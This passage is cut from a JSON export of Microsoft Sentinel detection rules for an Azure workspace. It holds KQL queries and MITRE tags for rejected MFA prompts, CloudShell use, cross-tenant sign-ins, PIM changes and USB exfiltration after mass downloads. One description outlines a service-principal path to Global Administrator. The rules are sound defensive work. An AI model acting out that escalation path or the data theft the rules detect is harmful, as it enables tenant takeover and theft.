365,IaaS,Windows\nMITRE:TA0001;T1195,TA0002;T1059","alertRuleTemplateName":"a3c144f9-8051-47d4-ac29-ffb0c312c910","lastModifiedUtc":"2024-10-02T20:56:14.4731077Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/71a9650a-ca38-43fa-9f5f-01bba047f661","name":"71a9650a-ca38-43fa-9f5f-01bba047f661","etag":"\"87006a28-0000-2700-0000-66fdbe560000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let riskScoreCutoff = 20; //Adjust this based on volume of results\nSigninLogs\n| where ResultType == 500121\n| extend additionalDetails_ = tostring(Status.additionalDetails)\n| extend UserPrincipalName = tolower(UserPrincipalName)\n| where additionalDetails_ =~ \"MFA denied; user declined the authentication\" or additionalDetails_ has \"fraud\"\n| summarize StartTime = min(TimeGenerated), EndTIme = max(TimeGenerated) by UserPrincipalName, UserId, AADTenantId, IPAddress\n| extend Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\n| join kind=leftouter (\n    IdentityInfo\n    | summarize LatestReportTime = arg_max(TimeGenerated, *) by AccountUPN\n    | project AccountUPN, Tags, JobTitle, GroupMembership, AssignedRoles, UserType, IsAccountEnabled\n    | summarize\n        Tags = make_set(Tags, 1000),\n        GroupMembership = make_set(GroupMembership, 1000),\n        AssignedRoles = make_set(AssignedRoles, 1000),\n        UserType = make_set(UserType, 1000),\n        UserAccountControl = make_set(UserType, 1000)\n    by AccountUPN\n    | extend UserPrincipalName=tolower(AccountUPN)\n) on UserPrincipalName\n| join kind=leftouter (\n    BehaviorAnalytics\n    | where ActivityType in (\"FailedLogOn\", \"LogOn\")\n    | where isnotempty(SourceIPAddress)\n    | project UsersInsights, DevicesInsights, ActivityInsights, InvestigationPriority, SourceIPAddress\n    | project-rename IPAddress = SourceIPAddress\n    | summarize\n        UsersInsights = make_set(UsersInsights, 1000),\n        DevicesInsights = make_set(DevicesInsights, 1000),\n        IPInvestigationPriority = sum(InvestigationPriority)\n    by IPAddress)\non IPAddress\n| extend UEBARiskScore = IPInvestigationPriority\n| where  UEBARiskScore > riskScoreCutoff\n| sort by UEBARiskScore desc \n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"templateVersion":"2.0.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"MFA Rejected by User","enabled":true,"description":"Identifies occurances where a user has rejected an MFA prompt. This could be an indicator that a threat actor has compromised the username and password of this user account and is using it to try and log into the account.\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-user-accounts#monitoring-for-failed-unusual-sign-ins\nThis query has also been updated to include UEBA logs IdentityInfo and BehaviorAnalytics for contextual information around the results.\nPLATFORM:Azure AD,IaaS,Microsoft 365\nMITRE:TA0003;T1098;T1098.001;T1098.003","alertRuleTemplateName":"d99cf5c3-d660-436c-895b-8a8f8448da23","lastModifiedUtc":"2024-10-02T21:42:45.6201796Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/77fac525-2e00-4088-83bd-7f86c7e0d65b","name":"77fac525-2e00-4088-83bd-7f86c7e0d65b","etag":"\"1b007cc8-0000-2700-0000-66d8a5c40000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT2H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let query_frequency = 1h;\nlet query_period = 2h;\nAuditLogs\n| where TimeGenerated > ago(query_period)\n| where Category =~ \"ApplicationManagement\" and LoggedByService =~ \"Core Directory\"\n| where OperationName =~ \"Add app role assignment to service principal\"\n| mv-expand TargetResource = TargetResources\n| mv-expand modifiedProperty = TargetResource[\"modifiedProperties\"]\n| where tostring(modifiedProperty[\"displayName\"]) == \"AppRole.Value\"\n| extend PermissionGrant = tostring(modifiedProperty[\"newValue\"])\n| where PermissionGrant has \"RoleManagement.ReadWrite.Directory\"\n| mv-apply modifiedProperty = TargetResource[\"modifiedProperties\"] on (\n    summarize modifiedProperties = make_bag(\n        bag_pack(tostring(modifiedProperty[\"displayName\"]),\n            bag_pack(\"oldValue\", trim(@'[\\\"\\s]+', tostring(modifiedProperty[\"oldValue\"])),\n                \"newValue\", trim(@'[\\\"\\s]+', tostring(modifiedProperty[\"newValue\"])))), 100)\n)\n| project\n    PermissionGrant_TimeGenerated = TimeGenerated,\n    PermissionGrant_OperationName = OperationName,\n    PermissionGrant_Result = Result,\n    PermissionGrant,\n    AppDisplayName = tostring(modifiedProperties[\"ServicePrincipal.DisplayName\"][\"newValue\"]),\n    AppServicePrincipalId = tostring(modifiedProperties[\"ServicePrincipal.ObjectID\"][\"newValue\"]),\n    PermissionGrant_InitiatedBy = InitiatedBy,\n    PermissionGrant_TargetResources = TargetResources,\n    PermissionGrant_AdditionalDetails = AdditionalDetails,\n    PermissionGrant_CorrelationId = CorrelationId\n| join kind=inner (\n    AuditLogs\n    | where TimeGenerated > ago(query_frequency)\n    | where Category =~ \"RoleManagement\" and LoggedByService =~ \"Core Directory\" and AADOperationType =~ \"Assign\"\n    | where isnotempty(InitiatedBy[\"app\"])\n    | mv-expand TargetResource = TargetResources\n    | mv-expand modifiedProperty = TargetResource[\"modifiedProperties\"]\n    | where tostring(modifiedProperty[\"displayName\"]) in (\"Role.DisplayName\", \"RoleDefinition.DisplayName\")\n    | extend RoleAssignment = tostring(modifiedProperty[\"newValue\"])\n    | where RoleAssignment contains \"Admin\"\n    | project\n        RoleAssignment_TimeGenerated = TimeGenerated,\n        RoleAssignment_OperationName = OperationName,\n        RoleAssignment_Result = Result,\n        RoleAssignment,\n        TargetType = tostring(TargetResources[0][\"type\"]),\n        Target = iff(isnotempty(TargetResources[0][\"displayName\"]), tostring(TargetResources[0][\"displayName\"]), tolower(TargetResources[0][\"userPrincipalName\"])),\n        TargetId = tostring(TargetResources[0][\"id\"]),\n        RoleAssignment_InitiatedBy = InitiatedBy,\n        RoleAssignment_TargetResources = TargetResources,\n        RoleAssignment_AdditionalDetails = AdditionalDetails,\n        RoleAssignment_CorrelationId = CorrelationId,\n        AppServicePrincipalId = tostring(InitiatedBy[\"app\"][\"servicePrincipalId\"])\n    ) on AppServicePrincipalId\n| where PermissionGrant_TimeGenerated < RoleAssignment_TimeGenerated\n| extend\n    TargetName = tostring(split(Target, \"@\")[0]),\n    TargetUPNSuffix = tostring(split(Target, \"@\")[1])\n| project PermissionGrant_TimeGenerated, PermissionGrant_OperationName, PermissionGrant_Result, PermissionGrant, AppDisplayName, AppServicePrincipalId, PermissionGrant_InitiatedBy, PermissionGrant_TargetResources, PermissionGrant_AdditionalDetails, PermissionGrant_CorrelationId, \nRoleAssignment_TimeGenerated, RoleAssignment_OperationName, RoleAssignment_Result, RoleAssignment, TargetType, Target, TargetName, TargetUPNSuffix, TargetId, RoleAssignment_InitiatedBy, RoleAssignment_TargetResources, RoleAssignment_AdditionalDetails, RoleAssignment_CorrelationId\n| extend PermissionGrant_InitiatingUserPrincipalName = tostring(PermissionGrant_InitiatedBy.user.userPrincipalName)\n| extend PermissionGrant_InitiatingAadUserId = tostring(PermissionGrant_InitiatedBy.user.id)\n| extend PermissionGrant_InitiatingIpAddress = tostring(iff(isnotempty(PermissionGrant_InitiatedBy.user.ipAddress), PermissionGrant_InitiatedBy.user.ipAddress, PermissionGrant_InitiatedBy.app.ipAddress))\n| extend PermissionGrant_InitiatingAccountName = tostring(split(PermissionGrant_InitiatingUserPrincipalName, \"@\")[0]), PermissionGrant_InitiatingAccountUPNSuffix = tostring(split(PermissionGrant_InitiatingUserPrincipalName, \"@\")[1])\n| extend RoleAssignment_InitiatingUserPrincipalName = tostring(RoleAssignment_InitiatedBy.user.userPrincipalName)\n| extend RoleAssignment_InitiatingAadUserId = tostring(RoleAssignment_InitiatedBy.user.id)\n| extend RoleAssignment_InitiatingIpAddress = tostring(iff(isnotempty(RoleAssignment_InitiatedBy.user.ipAddress), RoleAssignment_InitiatedBy.user.ipAddress, RoleAssignment_InitiatedBy.app.ipAddress))\n| extend RoleAssignment_InitiatingAccountName = tostring(split(RoleAssignment_InitiatingUserPrincipalName, \"@\")[0]),  RoleAssignment_InitiatingAccountUPNSuffix = tostring(split(RoleAssignment_InitiatingUserPrincipalName, \"@\")[1])\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"AppDisplayName"},{"identifier":"AadUserId","columnName":"AppServicePrincipalId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Target"},{"identifier":"Name","columnName":"TargetName"},{"identifier":"UPNSuffix","columnName":"TargetUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"PermissionGrant_InitiatingUserPrincipalName"},{"identifier":"Name","columnName":"PermissionGrant_InitiatingAccountName"},{"identifier":"UPNSuffix","columnName":"PermissionGrant_InitiatingAccountUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"PermissionGrant_InitiatingAadUserId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"RoleAssignment_InitiatingUserPrincipalName"},{"identifier":"Name","columnName":"RoleAssignment_InitiatingAccountName"},{"identifier":"UPNSuffix","columnName":"RoleAssignment_InitiatingAccountUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"RoleAssignment_InitiatingAadUserId"}]}],"templateVersion":"1.1.0","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation","Persistence"],"techniques":["T1098","T1078"],"displayName":"Admin promotion after Role Management Application Permission Grant","enabled":true,"description":"This rule looks for a service principal being granted the Microsoft Graph RoleManagement.ReadWrite.Directory (application) permission before being used to add an Microsoft Entra ID object or user account to an Admin directory role (i.e. Global Administrators).\nThis is a known attack path that is usually abused when a service principal already has the AppRoleAssignment.ReadWrite.All permission granted. This permission allows an app to manage permission grants for application permissions to any API.\nA service principal can promote itself or other service principals to admin roles (i.e. Global Administrators). This would be considered a privilege escalation technique.\nRef : https://docs.microsoft.com/graph/permissions-reference#role-management-permissions, https://docs.microsoft.com/graph/api/directoryrole-post-members?view=graph-rest-1.0&tabs=http\n\nPLATFORM:Azure AD,Microsoft 365,IaaS;MITRE:TA0003;T1078;T1078.004,TA0004;T1078;T1078.004;T1098;T1098.003","alertRuleTemplateName":"f80d951a-eddc-4171-b9d0-d616bb83efdc","lastModifiedUtc":"2024-09-04T18:24:02.4829029Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/459f4c98-72b0-4adc-9e11-56d406a46010","name":"459f4c98-72b0-4adc-9e11-56d406a46010","etag":"\"87001816-0000-2700-0000-66fdbd300000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let match_window = 3m;\nAzureActivity\n| where ResourceGroup has \"cloud-shell\"\n| where (OperationNameValue =~ \"Microsoft.Storage/storageAccounts/listKeys/action\")\n| where ActivityStatusValue =~ \"Success\"\n| extend TimeKey = bin(TimeGenerated, match_window), AzureIP = CallerIpAddress\n| join kind = inner\n(AzureActivity\n| where ResourceGroup has \"cloud-shell\"\n| where (OperationNameValue =~ \"Microsoft.Storage/storageAccounts/write\")\n| extend TimeKey = bin(TimeGenerated, match_window), UserIP = CallerIpAddress\n) on Caller, TimeKey\n| summarize count() by TimeKey, Caller, ResourceGroup, SubscriptionId, TenantId, AzureIP, UserIP, HTTPRequest, Type, Properties, CategoryValue, OperationList = strcat(OperationNameValue, ' , ', OperationNameValue1)\n| extend Name = tostring(split(Caller,'@',0)[0]), UPNSuffix = tostring(split(Caller,'@',1)[0])\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Caller"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"UserIP"}]}],"templateVersion":"2.0.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution"],"techniques":["T1059"],"displayName":"New CloudShell User","enabled":true,"description":"Identifies when a user creates an Azure CloudShell for the first time.\nMonitor this activity to ensure only the expected users are using CloudShell.\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004,TA0002;T1059;T1059.009","alertRuleTemplateName":"6d7214d9-4a28-44df-aafb-0910b9e6ae3e","lastModifiedUtc":"2024-10-02T21:37:52.381615Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/534ed6f1-803c-430d-87cd-98bed36ce12d","name":"534ed6f1-803c-430d-87cd-98bed36ce12d","etag":"\"88006f13-0000-2700-0000-66fdcdef0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Get details of current Azure Ranges (note this URL updates regularly so will need to be manually updated over time)\n// You may find the name of the new JSON here: https://www.microsoft.com/download/details.aspx?id=56519\n// On the downloads page, click the 'details' button, and then replace just the filename in the URL below\nlet azure_ranges = externaldata(changeNumber: string, cloud: string, values: dynamic)\n[\"https://raw.githubusercontent.com/microsoft/mstic/master/PublicFeeds/MSFTIPRanges/ServiceTags_Public.json\"] with(format='multijson')\n| mv-expand values\n| mv-expand values.properties.addressPrefixes\n| mv-expand values_properties_addressPrefixes\n| summarize by tostring(values_properties_addressPrefixes)\n| extend isipv4 = parse_ipv4(values_properties_addressPrefixes)\n| extend isipv6 = parse_ipv6(values_properties_addressPrefixes)\n| extend ip_type = case(isnotnull(isipv4), \"v4\", \"v6\")\n| summarize make_list(values_properties_addressPrefixes) by ip_type\n;\nSigninLogs\n// Limiting to Azure Portal really reduces false positives and helps focus on potential admin activity\n| where ResultType == 0\n| where AppDisplayName =~ \"Azure Portal\"\n| extend isipv4 = parse_ipv4(IPAddress)\n| extend ip_type = case(isnotnull(isipv4), \"v4\", \"v6\")\n // Only get logons where the IP address is in an Azure range\n| join kind=fullouter (azure_ranges) on ip_type\n| extend ipv6_match = ipv6_is_in_any_range(IPAddress,  list_values_properties_addressPrefixes)\n| extend ipv4_match = ipv4_is_in_any_range(IPAddress,  list_values_properties_addressPrefixes)\n| where ipv4_match or ipv6_match \n// Limit to where the user is external to the tenant\n| where HomeTenantId != ResourceTenantId\n// Further limit it to just access to the current tenant (you can drop this if you wanted to look elsewhere as well but it helps reduce FPs)\n| where ResourceTenantId == AADTenantId\n| summarize FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated), make_set(ResourceDisplayName) by UserPrincipalName, IPAddress, UserAgent, Location, HomeTenantId, ResourceTenantId, UserId\n| extend AccountName = split(UserPrincipalName, \"@\")[0]\n| extend UPNSuffix = split(UserPrincipalName, \"@\")[1]\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"},{"identifier":"Name","columnName":"AccountName"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"alertDetailsOverride":{"alertDisplayNameFormat":"Azure Portal sign in by {{UserPrincipalName}} from another Azure Tenant with IP Address {{IPAddress}}","alertDescriptionFormat":"This query looks for successful sign in attempts to the Azure Portal where the user who is signing in from another Azure tenant,\nand the IP address the login attempt is from is an Azure IP. A threat actor who compromises an Azure tenant may look\nto pivot to other tenants leveraging cross-tenant delegated access in this manner.\nIn this instance {{UserPrincipalName}} logged in at {{FirstSeen}} from IP Address {{IPAddress}}.\n"},"templateVersion":"2.0.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1199"],"displayName":"Azure Portal sign in from another Azure Tenant","enabled":true,"description":"This query looks for successful sign in attempts to the Azure Portal where the user who is signing in from another Azure tenant, and the IP address the login attempt is from is an Azure IP. A threat actor who compromises an Azure tenant may look to pivot to other tenants leveraging cross-tenant delegated access in this manner.\nPLATFORM:Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1199","alertRuleTemplateName":"87210ca1-49a4-4a7d-bb4a-4988752f978c","lastModifiedUtc":"2024-10-02T22:49:18.3647509Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ddd9be3b-acc7-4da3-854b-174c419c5b35","name":"ddd9be3b-acc7-4da3-854b-174c419c5b35","etag":"\"8700df6e-0000-2700-0000-66fdc3230000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"AuditLogs\n  | where Category =~ \"RoleManagement\"\n  | where OperationName =~ \"Update role setting in PIM\"\n  | extend userPrincipalName = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n  | extend ipAddress = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)\n  | project-reorder TimeGenerated, OperationName, ResultReason, userPrincipalName, ipAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"userPrincipalName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ipAddress"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence","DefenseEvasion"],"techniques":["T1078","T1098"],"displayName":"Changes to PIM Settings","enabled":true,"description":"PIM provides a key mechanism for assigning privileges to accounts, this query detects changes to PIM role settings.\n  Monitor these changes to ensure they are being made legitimately and don't confer more privileges than expected or reduce the security of a PIM elevation.\n\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-accounts#changes-to-privileged-accounts\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004,TA0003;T1078;T1078.001;T1078.004,TA0005;T1078;T1078.004","alertRuleTemplateName":"0ed0fe7c-af29-4990-af7f-bb5ccb231198","lastModifiedUtc":"2024-10-02T22:03:14.4111909Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/3a014b57-d9f6-46b6-8b3e-44e1aca99935","name":"3a014b57-d9f6-46b6-8b3e-44e1aca99935","etag":"\"53007a8c-0000-2700-0000-64a2dd260000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"ThreatIntelligence","properties":{"alertRuleTemplateName":"0dd422ee-e6af-4204-b219-f59ac172e4c6","severity":"Medium","tactics":["Persistence","LateralMovement"],"techniques":[],"displayName":"(Preview) Microsoft Defender Threat Intelligence Analytics","enabled":true,"description":"This rule generates an alert when a Microsoft Defender Threat Intelligence Indicator gets matched with your event logs. The alerts are very high fidelity.","lastModifiedUtc":"2023-07-03T14:37:26.427124Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/edfc41cd-ff33-4a3a-b080-44771f865cc7","name":"edfc41cd-ff33-4a3a-b080-44771f865cc7","etag":"\"8700972e-0000-2700-0000-66fdbeb90000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let Alerts = SecurityAlert\n| where AlertName =~ \"mass download by a single user\"\n| where Status != 'Resolved'\n| extend ipEnt = parse_json(Entities), accountEnt = parse_json(Entities)\n| mv-apply tempParams = ipEnt on (\nmv-expand ipEnt\n| where ipEnt.Type == \"ip\" \n| extend IpAddress = tostring(ipEnt.Address)\n)\n| mv-apply tempParams = accountEnt on (\nmv-expand accountEnt\n| where accountEnt.Type == \"account\"\n| extend AADUserId = tostring(accountEnt.AadUserId)\n)\n| extend Alert_TimeGenerated = TimeGenerated\n| distinct Alert_TimeGenerated, IpAddress, AADUserId, DisplayName, Description, ProductName, ExtendedProperties, Entities, Status, CompromisedEntity\n;\nlet CA_Events = CloudAppEvents\n| where ActionType == \"FileDownloaded\"\n| extend parsed = parse_json(RawEventData)\n| extend UserId = tostring(parsed.UserId)\n| extend FileName = tostring(parsed.SourceFileName)\n| extend FileExtension = tostring(parsed.SourceFileExtension)\n| summarize CloudAppEvent_StartTime = min(TimeGenerated), CloudAppEvent_EndTime = max(TimeGenerated), CloudAppEvent_Files = make_set(FileName), FileCount = dcount(FileName) by Application, AccountObjectId, UserId, IPAddress, City, CountryCode\n| extend CloudAppEvents_Details = pack_all();\nlet CA_Alerts_Events = Alerts | join kind=inner (CA_Events)\non $left.AADUserId == $right.AccountObjectId and $left.IpAddress == $right.IPAddress\n// Cloud app event comes before Alert\n| where CloudAppEvent_EndTime <= Alert_TimeGenerated\n| project Alert_TimeGenerated, UserId, AADUserId, IPAddress, CloudAppEvents_Details, CloudAppEvent_Files\n;\n// setup list to filter DeviceFileEvents for only files downloaded as indicated by CloudAppEvents\nlet CA_FileList = CA_Alerts_Events | project CloudAppEvent_Files;\nCA_Alerts_Events\n| join kind=inner ( DeviceFileEvents\n| where ActionType in (\"FileCreated\", \"FileRenamed\")\n| where FileName in~ (CA_FileList)\n| summarize DeviceFileEvent_StartTime = min(TimeGenerated), DeviceFileEvent_EndTime = max(TimeGenerated), DeviceFileEvent_Files = make_set(FolderPath), DeviceFileEvent_FileCount = dcount(FolderPath) by InitiatingProcessAccountUpn, DeviceId, DeviceName, InitiatingProcessFolderPath, InitiatingProcessParentFileName//, InitiatingProcessCommandLine\n| extend DeviceFileEvents_Details = pack_all()\n) on $left.UserId == $right.InitiatingProcessAccountUpn\n| where DeviceFileEvent_StartTime >= Alert_TimeGenerated\n| join kind=inner (\n// get device events where a USB drive was mounted\nDeviceEvents\n| where ActionType == \"UsbDriveMounted\"\n| extend parsed = parse_json(AdditionalFields)\n| extend USB_DriveLetter = tostring(AdditionalFields.DriveLetter), USB_ProductName = tostring(AdditionalFields.ProductName), USB_Volume = tostring(AdditionalFields.Volume)\n| where isnotempty(USB_DriveLetter)\n| project USB_TimeGenerated = TimeGenerated, DeviceId, USB_DriveLetter, USB_ProductName, USB_Volume\n| extend USB_Details = pack_all()\n)  \non DeviceId\n// USB event occurs after the Alert\n| where USB_TimeGenerated >= Alert_TimeGenerated\n| mv-expand DeviceFileEvent_Files\n| extend DeviceFileEvent_Files = tostring(DeviceFileEvent_Files)\n// make sure that we only pickup the files that have the USB drive letter\n| where DeviceFileEvent_Files startswith USB_DriveLetter\n| summarize USB_Drive_MatchedFiles = make_set_if(DeviceFileEvent_Files, DeviceFileEvent_Files startswith USB_DriveLetter) by Alert_TimeGenerated, USB_TimeGenerated, UserId, AADUserId, DeviceId, DeviceName, IPAddress, CloudAppEvents_Details = tostring(CloudAppEvents_Details), DeviceFileEvents_Details = tostring(DeviceFileEvents_Details), USB_Details = tostring(USB_Details)\n| extend InitiatingProcessFileName = tostring(split(todynamic(DeviceFileEvents_Details).InitiatingProcessFolderPath, \"\\\\\")[-1]), InitiatingProcessFolderPath = tostring(todynamic(DeviceFileEvents_Details).InitiatingProcessFolderPath)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserId"},{"identifier":"AadUserId","columnName":"AADUserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"InitiatingProcessFileName"},{"identifier":"Directory","columnName":"InitiatingProcessFolderPath"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Exfiltration"],"techniques":["T1052"],"displayName":"Mass Download & copy to USB device by single user","enabled":true,"description":"This query looks for any mass download by a single user with possible file copy activity to a new USB drive. Malicious insiders may perform such activities that may cause harm to the organization. \nThis query could also reveal unintentional insider that had no intention of malicious activity but their actions may impact an organizations security posture.\nReference:https://docs.microsoft.com/defender-cloud-apps/policy-template-reference\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0004;T1078;T1078.001;T1078.004","alertRuleTemplateName":"6267ce44-1e9d-471b-9f1e-ae76a6b7aa84","lastModifiedUtc":"2024-10-02T21:44:22.7307901Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/80a73e0c-af35-4327-a8db-b3df743acc22","name":"80a73e0c-af35-4327-a8db-b3df743acc22","etag":"\"530079ad-0000-2700-0000-64a2e2170000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"MicrosoftSecurityIncidentCreation","properties":{"productFilter":"Office 365 Advanced Threat Protection","severitiesFilter":null,"displayNamesFilter":null,"displayNamesExcludeFilter":null,"displayName":"Create incidents based on Microsoft Defender for Office 365 alerts","enabled":false,"description":"Create incidents based on all alerts generated in Microsoft Defender for Office 365","alertRuleTemplateName":"ee1d718b-9ed9-4a71-90cd-a483a4f008df","lastModifiedUtc":"2023-07-03T14:58:31.6811968Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/cd6091d7-00d5-40d2-811a-45c06e0de744","name":"cd6091d7-00d5-40d2-811a-45c06e0de744","etag":"\"7009984c-0000-2700-0000-669977960000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P2D","queryPeriod":"P2D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// In User & Groups and in Applications, the following \"AccessType\" values in columns PremodifiedInboundSettings and ModifiedInboundSettings are interpreted accordingly\n// When Access Type in premodified inbound settings value was 1 that means that the initial access was allowed. When Access Type in premodified inbound settings value was 2 that means that the initial access was blocked.\n// When Access Type in modified inbound settings value is 1 that means that now access is allowed. When Access Type in modified inbound settings value is 2 that means that now access is blocked.\nAuditLogs\n| where OperationName has \"Update a partner cross-tenant access setting\"\n| mv-apply TargetResource = TargetResources on\n  (\n      where TargetResource.type =~ \"Policy\"\n      | extend Properties = TargetResource.modifiedProperties\n  )\n| mv-apply Property = Properties on\n  (\n      where Property.displayName 